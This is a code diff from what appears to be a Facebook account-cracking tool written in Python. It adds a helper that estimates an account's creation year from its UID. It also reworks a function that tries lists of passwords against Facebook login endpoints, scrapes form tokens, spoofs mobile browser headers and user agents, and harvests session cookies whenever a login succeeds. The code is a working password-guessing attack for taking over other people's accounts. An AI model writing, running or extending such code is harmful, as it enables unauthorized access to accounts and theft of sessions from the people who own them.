@@ -373,7 +373,44 @@ def check_applications(session,coki):
             print(f"\r{P}[{R}%s{P}]. %s%s"%(i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
             print(f'\r')
-                       
+            
+            
+
+ 
+
+
+
+#-----------------------[ID CREATION YEAR CHECKER]-----------------------#
+def creation(uid):
+    if len(uid)==15:
+        if uid[:10] in ['1000000000']       :younisxyz = '| 2009'
+        elif uid[:9] in ['100000000']       :younisxyz = '| 2009'
+        elif uid[:8] in ['10000000']        :younisxyz = '| 2009'
+        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:younisxyz = '| 2009'
+        elif uid[:7] in ['1000006','1000007','1000008','1000009']:younisxyz = '| 2010'
+        elif uid[:6] in ['100001']          :younisxyz = '| 2010/2011'
+        elif uid[:6] in ['100002','100003'] :younisxyz = '| 2011/2012'
+        elif uid[:6] in ['100004']          :younisxyz = '| 2012/2013'
+        elif uid[:6] in ['100005','100006'] :younisxyz = '| 2013/2014'
+        elif uid[:6] in ['100007','100008'] :younisxyz = '| 2014/2015'
+        elif uid[:6] in ['100009']          :younisxyz = '| 2015'
+        elif uid[:5] in ['10001']           :younisxyz = '| 2015/2016'
+        elif uid[:5] in ['10002']           :younisxyz = '| 2016/2017'
+        elif uid[:5] in ['10003']           :younisxyz = '| 2018/2019'
+        elif uid[:5] in ['10004']           :younisxyz = '| 2019/2020'
+        elif uid[:5] in ['10005']           :younisxyz = '| 2020'
+        elif uid[:5] in ['10006','10007','']:younisxyz = '| 2021'
+        elif uid[:5] in ['10008']           :younisxyz = '| 2022'
+        else:younisxyz=''
+    elif len(uid) in [9,10]:
+        younisxyz = '| 2008/2009'
+    elif len(uid)==8:
+        younisxyz = '| 2007/2008'
+    elif len(uid)==7:
+        younisxyz = '| 2006/2007'
+    else:younisxyz=''
+    return younisxyz
+
 #---------------------[MAIN MENU]---------------------#
 def RANDOM_MENU():
     clear()
@@ -698,19 +735,16 @@ def Choice_Password():
 
 def YounisXyz(uid,pwx,tl):
     global loop
-    global cps
-    global oks
-    global twf
-    global proxy
+    global ok,cp
+    global ugen
     try:
         for ps in pwx:
-            pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r [\033[38;5;46mFELLIX\033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m] [CP\033[1;97m:-\033[38;5;196m%s\033[1;97m] [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
-            sys.stdout.flush()
-            free_fb = session.get('https://developer.facebook.com').text
+            ua = random.choice(ugen)
+            XyzAgents = ua_mfacebook()
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
@@ -719,33 +753,27 @@ def YounisXyz(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'developer.facebook.com',
-            'method': 'page',
-            'scheme': 'https',
-            'x-fb-rlafr': '0',
-            'access-control-allow-origin': '*',
-            'facebook-api-version': 'v16.0',
-            'strict-transport-security': 'max-age=15552000',
-            'pragma': 'no-cache',
-            'cache-control': 'private, no-cache, no-store, must-revalidate',
-            'x-fb-request-id': 'AVkvp5xaRmJlvLSVh6yZcZO',
-            'x-fb-trace-id': 'ECKbEwu+6l/',
-            'x-fb-rev': '1007202889',
-            'x-fb-debug': '38MdzEKtayv2w3Tf2jKDeBqx0OuKSOW/XE2RLHVCyttv36RP9rNVPsp3nIGRjfGpzl9PnzoM8QEZfZq45nM3Yw==',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            'cache-control': 'max-age=0',
-            'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AffNHiEkem8kLgwWBIW3EFsu0vpg8RpRucM-p4NArG2I4LkBRWRd2GIJQ20-jmC9DxOZCAsAnG5MBoQ50ID8tvOP8QKWbPNraeqicU3CML1sqg&smuh=52779&lh=Ac8j6v9a_PfzQcLalAQ&refid=7&ref_component=mbasic_footer&_rdr',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',params=params,headers=head,data=data,allow_redirects=False)
+            xyzheader_fuck = {
+    'authority': 'free.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"TECNO KE5j"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',}
+            lo = session.post('https://free.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
